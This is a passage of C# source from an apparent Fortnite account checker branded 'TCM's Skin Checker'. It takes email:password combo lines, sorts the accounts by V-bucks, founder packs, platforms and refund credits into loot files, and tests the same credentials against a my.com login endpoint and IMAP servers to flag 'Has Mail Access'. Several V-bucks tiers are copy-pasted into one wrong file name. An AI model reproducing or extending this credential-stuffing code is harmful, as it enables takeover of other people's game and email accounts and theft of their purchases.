                                            TwoToEightSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("200-800 Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter TwoToEightWriter = File.AppendText(TwoToEightSaveName))
                                            {
                                                TwoToEightWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                        bool ToOneThousand = IsWithin(val, 801, 1000);
                                        if (ToOneThousand)
                                        {
                                            ToOneThousandSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("1-1,000k Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter ToOneThousandWriter = File.AppendText(ToOneThousandSaveName))
                                            {
                                                ToOneThousandWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                        bool ToTwoThousand = IsWithin(val, 1001, 2000);
                                        if (ToTwoThousand)
                                        {
                                            ToTwoThousandSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("1,000-2,000k Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter ToTwoThousandWriter = File.AppendText(ToTwoThousandSaveName))
                                            {
                                                ToTwoThousandWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                        bool ToThreeThousand = IsWithin(val, 2001, 3000);
                                        if (ToThreeThousand)
                                        {
                                            ToThreeThousandSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("2,000-3,000k Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter ToThreeThousandWriter = File.AppendText(ToThreeThousandSaveName))
                                            {
                                                ToThreeThousandWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                        bool ToFourThousand = IsWithin(val, 3001, 4000);
                                        if (ToFourThousand)
                                        {
                                            ToFourThousandSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("3,000-4,000k Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter ToFourThousandWriter = File.AppendText(ToFourThousandSaveName))
                                            {
                                                ToFourThousandWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                        bool ToFiveThousand = IsWithin(val, 4001, 5000);
                                        if (ToFiveThousand)
                                        {
                                            ToFiveThousandSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("3,000-4,000k Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter ToFiveThousandWriter = File.AppendText(ToFiveThousandSaveName))
                                            {
                                                ToFiveThousandWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                        bool ToSixThousand = IsWithin(val, 5001, 6000);
                                        if (ToSixThousand)
                                        {
                                            ToSixThousandSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("3,000-4,000k Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter ToSixThousandWriter = File.AppendText(ToSixThousandSaveName))
                                            {
                                                ToSixThousandWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                        bool ToSevenThousand = IsWithin(val, 6001, 7000);
                                        if (ToSevenThousand)
                                        {
                                            ToSevenThousandSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("3,000-4,000k Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter ToSevenThousandWriter = File.AppendText(ToSevenThousandSaveName))
                                            {
                                                ToSevenThousandWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                        bool ToEightThousand = IsWithin(val, 7001, 8000);
                                        if (ToEightThousand)
                                        {
                                            ToEightThousandSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("3,000-4,000k Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter ToEightThousandWriter = File.AppendText(ToEightThousandSaveName))
                                            {
                                                ToEightThousandWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                        bool ToNineThousand = IsWithin(val, 8001, 9000);
                                        if (ToNineThousand)
                                        {
                                            ToNineThousandSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("3,000-4,000k Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter ToNineThousandWriter = File.AppendText(ToNineThousandSaveName))
                                            {
                                                ToNineThousandWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                        bool ToTenThousand = IsWithin(val, 9001, 10000);
                                        if (ToTenThousand)
                                        {
                                            ToTenThousandSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("3,000-4,000k Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter ToTenThousandWriter = File.AppendText(ToTenThousandSaveName))
                                            {
                                                ToTenThousandWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                        bool AboveTenthousnad = IsWithin(val, 10001, 999999);
                                        if (AboveTenthousnad)
                                        {
                                            AboveTenThousandSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("3,000-4,000k Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter AboveTenThousandWriter = File.AppendText(AboveTenThousandSaveName))
                                            {
                                                AboveTenThousandWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                    }
                                }
                            }
                            catch
                            {
                                //User has no Vbucks - RIP
                            }
                        }
                        if (CheckForOtherInformation.Checked)
                        {
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                            }
                            sw.WriteLine("----------------------<Other Useful Information>------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("----------------------<Other Useful Information>------------------------");
                            }
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                            }
                            bool flag149 = x.Contains("AthenaGlider:defaultglider");
                            if (flag149)
                            {
                                JToken Info = JObject.Parse(x)["profileChanges"][0]["profile"];
                                //JToken Info2 = JObject.Parse(c)["profileChanges"][0]["profile"];
                                string CreatedAccount = (Info["created"].ToString());
                                string UpdatedAccount = (Info["updated"].ToString());
                                string LifetimeWinsAccount = (Info["stats"]["attributes"]["lifetime_wins"].ToString());
                                string AccountsLevel = (Info["stats"]["attributes"]["accountLevel"].ToString());
                                string AccountsProfileID = (Info["_id"].ToString());
                                string AccountsID = (Info["accountId"].ToString());
                                string CurrentSeasonLevel = (Info["stats"]["attributes"]["level"].ToString());
                                string HasBattlePassS7 = (Info["stats"]["attributes"]["book_purchased"].ToString());
                                string currentBPlevel = (Info["stats"]["attributes"]["book_level"].ToString());
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Profile ID:   (" + AccountsProfileID + ")");
                                }
                                sw.WriteLine("Profile ID:   (" + AccountsProfileID + ")");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Account ID:   (" + AccountsID + ")");
                                }
                                sw.WriteLine("Account ID:   (" + AccountsID + ")");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Account Creation Date:  (" + CreatedAccount + ")");
                                }
                                sw.WriteLine("Account Creation Date:  (" + CreatedAccount + ")");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Game Last Played:  (" + UpdatedAccount + ")");
                                }
                                sw.WriteLine("Game Last Played:  (" + UpdatedAccount + ")");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("LifeTime Wins   (" + LifetimeWinsAccount + ")");
                                }
                                sw.WriteLine("LifeTime Wins   (" + LifetimeWinsAccount + ")");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Season Level   (" + CurrentSeasonLevel + ")");
                                }
                                sw.WriteLine("Season Level   (" + CurrentSeasonLevel + ")");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Account Level   (" + AccountsLevel + ")");
                                }
                                sw.WriteLine("Account Level   (" + AccountsLevel + ")");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Has Current Battlepass: " + HasBattlePassS7);
                                }
                                sw.WriteLine("Has Current Battlepass: " + HasBattlePassS7);
                                if (HasBattlePassS7 == "True")
                                {
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Current Battlepass Level: " + currentBPlevel);
                                    }
                                    sw.WriteLine("Current Battlepass Level: " + currentBPlevel);
                                }
                            }
                            bool flag150 = x.Contains("AthenaGlider:founderglider");
                            if (flag150)
                            {
                                sw.WriteLine("Has Save The World ---> True");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Has Save The World ---> True");
                                }
                                if (!DisableCounterStats.Checked)
                                {
                                    try
                                    {
                                        string visit = wc.DownloadString("https://www.reliablecounter.com/count.php?page=5546933&digit=style/plain/1/&reloads=0");
                                    }
                                    catch
                                    {

                                    }
                                }
                                Interlocked.Increment(ref STW);
                                bool founderspacknumber = c.Contains("Token:founderspack_1") && !c.Contains("Token:founderspack_2") && !c.Contains("Token:founderspack_3") && !c.Contains("Token:founderspack_4") && !c.Contains("Token:founderspack_5");
                                if (founderspacknumber)
                                {
                                    sw.WriteLine("Has Founders Pack: (Standard Edition)");
                                    StandardSTW = StandardSTW + 1;
                                    TotalMoneyzSpent = TotalMoneyzSpent + 40;
                                    tp1.SetToolTip(nsLabel2, "Standard Edition: " + StandardSTW + "\nDelux Edition: " + DeluxEditionSTW + "\nSuper Delux Edition: " + SuperDeluxSTW + "\nLimited Edition: " + LimitedEditionSTWE + "\nUltimate Edition: " + UltimateEditionSTWE);
                                    if (SaveSTWTiersToFiles.Checked)
                                    {
                                        using (StreamWriter STWSaveStandard = File.AppendText(STWStandard))
                                        {
                                            STWSaveStandard.WriteLine(account);
                                        }
                                    }
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Has Founders Pack: (Standard Edition)");
                                    }
                                }
                                bool founderspacknumber2 = c.Contains("Token:founderspack_1") && c.Contains("Token:founderspack_2") && !c.Contains("Token:founderspack_3") && !c.Contains("Token:founderspack_4") && !c.Contains("Token:founderspack_5");
                                if (founderspacknumber2)
                                {
                                    sw.WriteLine("Has Founders Pack: (Delux Edition)");
                                    DeluxEditionSTW = DeluxEditionSTW + 1;
                                    TotalMoneyzSpent = TotalMoneyzSpent + 60;
                                    tp1.SetToolTip(nsLabel2, "Standard Edition: " + StandardSTW + "\nDelux Edition: " + DeluxEditionSTW + "\nSuper Delux Edition: " + SuperDeluxSTW + "\nLimited Edition: " + LimitedEditionSTWE + "\nUltimate Edition: " + UltimateEditionSTWE);
                                    if (SaveSTWTiersToFiles.Checked)
                                    {
                                        using (StreamWriter STWSaveDelux = File.AppendText(STWDelux))
                                        {
                                            STWSaveDelux.WriteLine(account);
                                        }
                                    }
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Has Founders Pack: (Delux Edition)");
                                    }
                                }
                                bool founderspacknumber3 = c.Contains("Token:founderspack_1") && c.Contains("Token:founderspack_2") && c.Contains("Token:founderspack_3") && !c.Contains("Token:founderspack_4") && !c.Contains("Token:founderspack_5");
                                if (founderspacknumber3)
                                {
                                    sw.WriteLine("Has Founders Pack: (Super Delux Edition)");
                                    SuperDeluxSTW = SuperDeluxSTW + 1;
                                    TotalMoneyzSpent = TotalMoneyzSpent + 90;
                                    tp1.SetToolTip(nsLabel2, "Standard Edition: " + StandardSTW + "\nDelux Edition: " + DeluxEditionSTW + "\nSuper Delux Edition: " + SuperDeluxSTW + "\nLimited Edition: " + LimitedEditionSTWE + "\nUltimate Edition: " + UltimateEditionSTWE);
                                    if (SaveSTWTiersToFiles.Checked)
                                    {
                                        using (StreamWriter STWSaveSuperDelux = File.AppendText(STWSDelux))
                                        {
                                            STWSaveSuperDelux.WriteLine(account);
                                        }
                                    }
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Has Founders Pack: (Super Delux Edition)");
                                    }
                                }
                                bool founderspacknumber4 = c.Contains("Token:founderspack_1") && c.Contains("Token:founderspack_2") && c.Contains("Token:founderspack_3") && c.Contains("Token:founderspack_4") && !c.Contains("Token:founderspack_5");
                                if (founderspacknumber4)
                                {
                                    sw.WriteLine("Has Founders Pack: (Limited Edition)");
                                    LimitedEditionSTWE = LimitedEditionSTWE + 1;
                                    TotalMoneyzSpent = TotalMoneyzSpent + 150;
                                    tp1.SetToolTip(nsLabel2, "Standard Edition: " + StandardSTW + "\nDelux Edition: " + DeluxEditionSTW + "\nSuper Delux Edition: " + SuperDeluxSTW + "\nLimited Edition: " + LimitedEditionSTWE + "\nUltimate Edition: " + UltimateEditionSTWE);
                                    if (SaveSTWTiersToFiles.Checked)
                                    {
                                        using (StreamWriter STWSaveLimitedEdition = File.AppendText(STWLimited))
                                        {
                                            STWSaveLimitedEdition.WriteLine(account);
                                        }
                                    }
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Has Founders Pack: (Limited Edition)");
                                    }
                                }
                                if (STWSaveFile.Checked)
                                {
                                    using (StreamWriter Stheworld = File.AppendText(SaveTheWorld))
                                    {
                                        Stheworld.WriteLine(account);
                                    }
                                }
                                bool founderspacknumber5 = c.Contains("Token:founderspack_1") && c.Contains("Token:founderspack_2") && c.Contains("Token:founderspack_3") && c.Contains("Token:founderspack_4") && c.Contains("Token:founderspack_5");
                                if (founderspacknumber5)
                                {
                                    sw.WriteLine("Has Founders Pack: (Ultimate Edition)");
                                    UltimateEditionSTWE = UltimateEditionSTWE + 1;
                                    TotalMoneyzSpent = TotalMoneyzSpent + 150 + 150;
                                    tp1.SetToolTip(nsLabel2, "Standard Edition: " + StandardSTW + "\nDelux Edition: " + DeluxEditionSTW + "\nSuper Delux Edition: " + SuperDeluxSTW + "\nLimited Edition: " + LimitedEditionSTWE + "\nUltimate Edition: " + UltimateEditionSTWE);
                                    if (SaveSTWTiersToFiles.Checked)
                                    {
                                        using (StreamWriter STWSaveLimitedEdition = File.AppendText(STWUltimate))
                                        {
                                            STWSaveLimitedEdition.WriteLine(account);
                                        }
                                    }
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Has Founders Pack: (Ultimate Edition)");
                                    }
                                }
                            }
                            else if (flag150 == false)
                            {
                                sw.WriteLine("Has Save The World ---> False");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Has Save The World ---> False");
                                }
                            }
                            bool flag153 = c.Contains("Currency:MtxGiveaway");
                            if (flag153)
                            {
                                sw.WriteLine("Has Vbucks ---> True");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Has Vbucks ---> True");
                                }
                                JToken items = JObject.Parse(c)["profileChanges"][0]["profile"]["items"];

                                foreach (JToken item in items.Children())
                                {
                                    if (item.First["templateId"].ToString() == "Currency:MtxGiveaway")
                                    {
                                        sw.WriteLine("Amount Of Vbucks: " + item.First["quantity"].ToString());
                                        if (ListBoxDisableText.Checked == false)
                                        {
                                            FnBattleRoyalLB.Items.Add("Amount Of Vbucks: " + item.First["quantity"].ToString());
                                        }
                                        string foundvbucks = item.First["quantity"].ToString();
                                        if (VbucksSaveFile.Checked)
                                        {
                                            using (StreamWriter VbucksS = File.AppendText(Savevbucks))
                                            {
                                                VbucksS.WriteLine(account + " ---> " + foundvbucks + " Vbucks");
                                            }
                                        }
                                        int foundvbucksint = Int32.Parse(foundvbucks);
                                        VbucksFound = VbucksFound + foundvbucksint;
                                        break;
                                    }
                                }
                            }
                            else if (flag153 == false)
                            {
                                sw.WriteLine("Has Vbucks ---> False");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Has Vbucks ---> False");
                                }
                            }
                            bool flag172 = (c.Contains("FN_1000_POINTS") || c.Contains("FN_2800_POINTS"));
                            if (flag172)
                            {
                                try
                                {
                                    string ronekesult = c.Substring(c.IndexOf("FN_1000_POINTS") + 16, 3);
                                    string onekFinal = Regex.Replace(ronekesult, @"[^\d]", "");
                                    int finalonek = Int32.Parse(onekFinal);
                                    int finalonektogether = 1000 * finalonek;


                                    string twoeightkesult = c.Substring(c.IndexOf("FN_2800_POINTS") + 16, 3);
                                    string twoeightkFinal = Regex.Replace(twoeightkesult, @"[^\d]", "");
                                    int finaltwoeightk = Int32.Parse(twoeightkFinal);
                                    int finaltwoeightktogether = 2800 * finaltwoeightk;

                                    int bothnumberscombined = finalonektogether + finaltwoeightktogether;
                                    sw.WriteLine("Total Vbucks Ever Purchased: " + bothnumberscombined.ToString());
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Total Vbucks Ever Purchased: " + bothnumberscombined.ToString());
                                    }
                                }
                                catch
                                {

                                }
                            }
                            bool flag154 = c.Contains("current_mtx_platform");
                            if (flag154)
                            {
                                JToken Platform = JObject.Parse(c)["profileChanges"][0]["profile"];
                                sw.WriteLine("Main Platform Used: " + (Platform["stats"]["attributes"]["current_mtx_platform"].ToString()));
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Main Platform Used: " + (Platform["stats"]["attributes"]["current_mtx_platform"].ToString()));
                                }
                                sw.WriteLine("Platforms Used/Linked: ");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Platforms Used/Linked: ");
                                }
                                if (c.Contains("EpicPC"))
                                {
                                    if (PCSaveFile.Checked)
                                    {
                                        using (StreamWriter PCshitsave = File.AppendText(SavePCPlatform))
                                        {
                                            PCshitsave.WriteLine(account);
                                        }
                                    }
                                    sw.WriteLine("PC");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("PC");
                                    }
                                }
                                if (c.Contains("SONY") || c.Contains("PSN"))
                                {
                                    if (PS4SaveFile.Checked)
                                    {
                                        using (StreamWriter PS4shitsave = File.AppendText(SavePS4Platform))
                                        {
                                            PS4shitsave.WriteLine(account);
                                        }
                                    }
                                    sw.WriteLine("PSN");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("PSN");
                                    }
                                }
                                if (c.Contains("XBOX_LIVE") || c.Contains("Xbox"))
                                {
                                    if (XboxSaveFile.Checked)
                                    {
                                        using (StreamWriter Xboxshitsave = File.AppendText(SaveXboxPlatform))
                                        {
                                            Xboxshitsave.WriteLine(account);
                                        }
                                    }
                                    sw.WriteLine("Xbox");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Xbox");
                                    }
                                }
                                if (c.Contains("Nintendo"))
                                {
                                    if (NintendoSaveFile.Checked)
                                    {
                                        using (StreamWriter Nintendoshitsave = File.AppendText(SaveNintendoPlatform))
                                        {
                                            Nintendoshitsave.WriteLine(account);
                                        }
                                    }
                                    sw.WriteLine("Nintendo Switch");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Nintendo Switch");
                                    }
                                }
                                if (c.Contains("IOSAppStore"))
                                {
                                    sw.WriteLine("Cell Phone");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Cell Phone");
                                    }
                                }
                                bool flag155 = c.Contains("allowed_to_send_gifts");
                                if (flag155)
                                {
                                    JToken Giftjson = JObject.Parse(c)["profileChanges"][0]["profile"];
                                    string AllowedToSendGift = (Giftjson["stats"]["attributes"]["allowed_to_send_gifts"].ToString());
                                    string CanGetGifts = (Giftjson["stats"]["attributes"]["allowed_to_receive_gifts"].ToString());
                                    sw.WriteLine("Can Send Gift: " + AllowedToSendGift);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Can Send Gift: " + AllowedToSendGift);
                                    }
                                    sw.WriteLine("Can Recieve Gift: " + CanGetGifts);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Can Recieve Gift: " + CanGetGifts);

                                    }
                                    bool flag156 = c.Contains("refundsUsed");
                                    if (flag156)
                                    {
                                        JToken otherjson = JObject.Parse(c)["profileChanges"][0]["profile"];
                                        string RefundsUsed = (otherjson["stats"]["attributes"]["mtx_purchase_history"]["refundsUsed"].ToString());
                                        string RefundsLeft = (otherjson["stats"]["attributes"]["mtx_purchase_history"]["refundCredits"].ToString());

                                        sw.WriteLine("Refunds Used: " + RefundsUsed);
                                        if (ListBoxDisableText.Checked == false)
                                        {
                                            FnBattleRoyalLB.Items.Add("Refunds Used: " + RefundsUsed);
                                        }
                                        sw.WriteLine("Refunds Left: " + RefundsLeft);
                                        if (ListBoxDisableText.Checked == false)
                                        {
                                            FnBattleRoyalLB.Items.Add("Refunds Left: " + RefundsLeft);
                                        }
                                    }
                                    bool CompletedBday = x.Contains("084_birthday2018");
                                    if (CompletedBday)
                                    {
                                        sw.WriteLine("Completed 1ST B-Day Challenges: Yes");
                                        if (ListBoxDisableText.Checked == false)
                                        {
                                            FnBattleRoyalLB.Items.Add("Completed 1ST B-Day Challenges: Yes");
                                        }
                                    }
                                    else if (CompletedBday == false)
                                    {
                                        sw.WriteLine("Completed 1ST B-Day Challenges: No");
                                        if (ListBoxDisableText.Checked == false)
                                        {
                                            FnBattleRoyalLB.Items.Add("Completed First b-day Challenges: No");
                                        }
                                    }
                                    bool PlaysNote9 = x.Contains("cid_175_athena_commando_m_celestial");
                                    if (PlaysNote9)
                                    {
                                        sw.WriteLine("Plays On Galaxy Note 9: Yes");
                                        if (ListBoxDisableText.Checked == false)
                                        {
                                            FnBattleRoyalLB.Items.Add("Plays On Galaxy Note 9: Yes");
                                        }
                                    }
                                    else if (PlaysNote9 == false)
                                    {
                                        sw.WriteLine("Plays On Galaxy Note 9: No");
                                        if (ListBoxDisableText.Checked == false)
                                        {
                                            FnBattleRoyalLB.Items.Add("Plays On Galaxy Note 9: No");
                                        }
                                    }
                                    bool HasTwitchPacks = (x.Contains("AthenaCharacter:cid_085_athena_commando_m_twitch") || x.Contains("AthenaCharacter:cid_089_athena_commando_m_retrogrey"));
                                    if (HasTwitchPacks)
                                    {
                                        sw.WriteLine("Has Twitch Prime Pack #1: Yes");
                                        if (ListBoxDisableText.Checked == false)
                                        {
                                            FnBattleRoyalLB.Items.Add("Has Twitch Prime Pack #1: Yes");
                                        }
                                    }
                                    else if (HasTwitchPacks == false)
                                    {
                                        sw.WriteLine("Has Twitch Prime Pack #1: No");
                                        if (ListBoxDisableText.Checked == false)
                                        {
                                            FnBattleRoyalLB.Items.Add("Has Twitch Prime Pack #1: No");
                                        }
                                    }
                                    bool HasTwitchPacks2 = x.Contains("AthenaCharacter:cid_114_athena_commando_f_tacticalwoodland");
                                    if (HasTwitchPacks2)
                                    {
                                        sw.WriteLine("Has Twitch Prime Pack #1: Yes");
                                        if (ListBoxDisableText.Checked == false)
                                        {
                                            FnBattleRoyalLB.Items.Add("Has Twitch Prime Pack #1: Yes");
                                        }
                                    }
                                    else if (HasTwitchPacks2 == false)
                                    {
                                        sw.WriteLine("Has Twitch Prime Pack #2: No");
                                        if (ListBoxDisableText.Checked == false)
                                        {
                                            FnBattleRoyalLB.Items.Add("Has Twitch Prime Pack #2: No");
                                        }
                                    }
                                    bool BoughtStarterPack = (x.Contains("AthenaCharacter:cid_090_athena_commando_m_tactical") || x.Contains("AthenaCharacter:cid_139_athena_commando_m_fighterpilot"));
                                    if (BoughtStarterPack)
                                    {
                                        sw.WriteLine("Has Bought Starter Pack: Yes");
                                        if (ListBoxDisableText.Checked == false)
                                        {
                                            FnBattleRoyalLB.Items.Add("Has Bought Starter Pack: Yes");
                                        }
                                    }
                                    else if (BoughtStarterPack == false)
                                    {
                                        sw.WriteLine("Has Bought Starter Pack: No");
                                        if (ListBoxDisableText.Checked == false)
                                        {
                                            FnBattleRoyalLB.Items.Add("Has Bought Starter Pack: No");
                                        }
                                    }
                                    try
                                    {
                                        string text = account;
                                        if (text != null && text.Contains("@"))
                                        {
                                            string user = text.Split(new char[] { ':' })[0];
                                            string pass = text.Split(new char[] { ':' })[1];
                                            string validemailresponse = new WebClient().DownloadString("https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=" + user + "&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=fr_FR&Password=" + pass + "&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&");
                                            if (validemailresponse.Contains("Ok=1"))
                                            {
                                                if (ListBoxDisableText.Checked == false)
                                                {
                                                    FnBattleRoyalLB.Items.Add("Has Mail Access: " + "YES");
                                                }
                                                sw.WriteLine("Has Mail Access: " + "YES");
                                            }
                                            else
                                            {
                                                if (text != null && text.Contains("@"))
                                                {
                                                    string text2 = text.Split(new char[] { ':' })[0];
                                                    string text3 = text.Split(new char[] { ':' })[1];
                                                    string str = text2.Split(new char[] { '@' })[1];
                                                    try
                                                    {
                                                        ImapClient imapClient = new ImapClient();
                                                        imapClient.Connect("imap." + str, 993, true, default(CancellationToken));
                                                        imapClient.Authenticate(text2, text3, default(CancellationToken));
                                                        imapClient.Disconnect(true, default(CancellationToken));
                                                        if (ListBoxDisableText.Checked == false)
                                                        {
                                                            FnBattleRoyalLB.Items.Add("Has Mail Access: " + "YES");
                                                        }
                                                        sw.WriteLine("Has Mail Access: " + "YES");
                                                    }
                                                    catch
                                                    {
                                                        if (ListBoxDisableText.Checked == false)
                                                        {
                                                            FnBattleRoyalLB.Items.Add("Has Mail Access: " + "No");
                                                        }
                                                        sw.WriteLine("Has Mail Access: " + "No");
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    catch
                                    {

                                    }
                                }
                            }
                            if (CheckForBattlePassInformation.Checked)
                            {
                                sw.WriteLine("--------------------------------------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                                }
                                sw.WriteLine("----------------------<BattlePass Information>------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("----------------------<BattlePass Information>------------------------");
                                }
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                                }
                                sw.WriteLine("--------------------------------------------------------");
                                bool flag157 = x.Contains("AthenaCharacter:cid_032_athena_commando_m_medieval");
                                if (flag157 == true)
                                {
                                    sw.WriteLine("Had Season 2 BattlePass ---> Yes");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Had Season 2 BattlePass ---> Yes");
                                    }
                                    bool flagtrue1 = x.Contains("AthenaCharacter:cid_035_athena_commando_m_medieval");
                                    if (flagtrue1)
                                    {
                                        sw.WriteLine("Completed Season 2 BattlePass ---> " + "Yes");
                                        if (ListBoxDisableText.Checked == false)
                                        {
                                            FnBattleRoyalLB.Items.Add("Completed Season 2 BattlePass ---> " + "Yes");
                                        }
                                    }
                                    else if (flagtrue1 == false)
                                    {
                                        sw.WriteLine("Completed Season 2 BattlePass ---> " + "No");
                                        if (ListBoxDisableText.Checked == false)
                                        {
                                            FnBattleRoyalLB.Items.Add("Completed Season 2 BattlePass ---> " + "No");
                                        }
                                    }
                                }
                                else if (flag157 == false)
                                {
                                    sw.WriteLine("Had Season 2 BattlePass ---> No");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Had Season 2 BattlePass ---> No");
                                    }
                                }
                                bool flag158 = x.Contains("AthenaCharacter:cid_080_athena_commando_m_space");
                                if (flag158 == true)
                                {
                                    sw.WriteLine("Had Season 3 BattlePass ---> Yes");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Had Season 3 BattlePass ---> Yes");
                                    }
                                    bool flagtrue2 = x.Contains("AthenaCharacter:cid_084_athena_commando_m_assassin");
                                    if (flagtrue2)
                                    {
                                        sw.WriteLine("Completed Season 3 BattlePass ---> " + "Yes");
                                        if (ListBoxDisableText.Checked == false)
                                        {
                                            FnBattleRoyalLB.Items.Add("Completed Season 3 BattlePass ---> " + "Yes");
                                        }
                                    }
                                    else if (flagtrue2 == false)
                                    {
                                        sw.WriteLine("Completed Season 3 BattlePass ---> " + "No");
                                        if (ListBoxDisableText.Checked == false)
                                        {
                                            FnBattleRoyalLB.Items.Add("Completed Season 3 BattlePass ---> " + "No");
                                        }
                                    }
                                }
                                else if (flag158 == false)
                                {
                                    sw.WriteLine("Had Season 3 BattlePass ---> No");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Had Season 3 BattlePass ---> No");
                                    }
                                }
                                bool flag159 = x.Contains("AthenaCharacter:cid_115_athena_commando_m_carbideblue");
                                if (flag159 == true)
                                {
                                    sw.WriteLine("Had Season 4 BattlePass ---> Yes");
                                    if (ListBoxDisableText.Checked == false)
                                    {
